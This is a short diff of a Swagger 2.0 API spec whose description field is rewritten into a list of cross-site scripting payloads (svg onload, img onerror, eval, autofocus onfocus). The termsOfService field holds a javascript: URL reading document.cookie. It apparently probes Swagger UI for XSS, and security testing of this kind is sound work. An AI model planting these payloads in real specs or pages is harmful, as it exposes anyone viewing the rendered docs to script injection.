@@ -1,6 +1,6 @@
 swagger: "2.0"
 info:
-  description: "<img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1); style='height:2000px;width:2000px;float:top;'> filters." 
+  description: "<svg onload=alert(1)><img src=x onerror=confirm(String.fromCharCode(88,83,83));> filters.<svg id=alert(1) onload=eval(id)> <video><source onerror='javascript:alert(1)'> <body onload=alert(/XSS/.source)><input autofocus onfocus=alert(1)><select autofocus onfocus=alert(1)><textarea autofocus onfocus=alert(1)><keygen autofocus onfocus=alert(1)><video/poster/onerror=alert(1)>" 
   version: "1.0.0"
   title: "Jonathan JOhx"
   termsOfService: "'javascript:alert(document.cookie)"
